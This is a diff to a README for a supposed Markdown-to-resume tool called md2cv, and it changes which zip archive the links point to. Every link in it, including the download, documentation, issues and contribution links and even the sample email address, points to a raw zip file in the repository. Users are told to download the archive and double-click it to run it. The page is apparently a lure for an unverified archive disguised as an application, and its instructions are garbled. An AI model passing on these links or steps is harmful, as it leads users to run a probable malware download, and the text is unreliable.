@@ -6,7 +6,7 @@ Welcome to **md2cv**! This application helps you convert your Markdown resumes i
 
 ## 📥 Download Now
 
-[![Download md2cv](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip)](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip)
+[![Download md2cv](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip)](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,15 +20,15 @@ Before you download, ensure your system meets these requirements:
 
 To get started with md2cv, follow these simple steps:
 
-1. **Visit this page to download:** Click [here](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip) to go to the Releases page.
+1. **Visit this page to download:** Click [here](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip) to go to the Releases page.
    
 2. **Choose your version:** You’ll see a list of available versions. Select the most recent one for the best performance.
    
-3. **Download the files:** Find the installer file suitable for your operating system and click to download. This is usually named like `https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip` or similar.
+3. **Download the files:** Find the installer file suitable for your operating system and click to download. This is usually named like `https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip` or similar.
 
 4. **Extract the files:** Once the download finishes, locate the file and extract it to a folder on your computer.
 
-5. **Run the application:** Navigate to the extracted folder. Double-click the `https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip` (Windows) or `md2cv` (macOS/Linux) file to start the application. 
+5. **Run the application:** Navigate to the extracted folder. Double-click the `https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip` (Windows) or `md2cv` (macOS/Linux) file to start the application. 
 
 ## 🎨 Using md2cv
 
@@ -39,7 +39,7 @@ Before you can convert, you need a Markdown resume. Here's a simple template to 
 ```markdown
 # Your Name
 ## Contact Information
-- Email: https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip
+- Email: https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip
 - Phone: (123) 456-7890
 
 ## Summary
@@ -88,15 +88,15 @@ If you're interested in customizing your experience even further, md2cv offers a
 
 If you encounter issues or have questions, we’re here to help:
 
-- **Documentation:** Comprehensive guides and FAQs are available in the [Documentation](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip).
-- **Issues:** Report any bugs or feature requests on the [Issues page](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip).
+- **Documentation:** Comprehensive guides and FAQs are available in the [Documentation](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip).
+- **Issues:** Report any bugs or feature requests on the [Issues page](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip).
   
 ## ⭐ Collaborate
 
-Interested in contributing to md2cv? We welcome any input! Check our [Contribution Guidelines](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip) to get started.
+Interested in contributing to md2cv? We welcome any input! Check our [Contribution Guidelines](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip) to get started.
 
 ## 🏆 Conclusion
 
 Using md2cv, you can easily convert your Markdown resumes into professional documents. With customizable templates and an easy-to-use interface, you'll be well on your way to impressing potential employers. 
 
-For the latest version, remember to check [this page to download](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/examples/cv-md-v1.6.zip).
+For the latest version, remember to check [this page to download](https://github.com/delacruzrod/md2cv/raw/refs/heads/main/templates/cv-md-v1.1.zip).
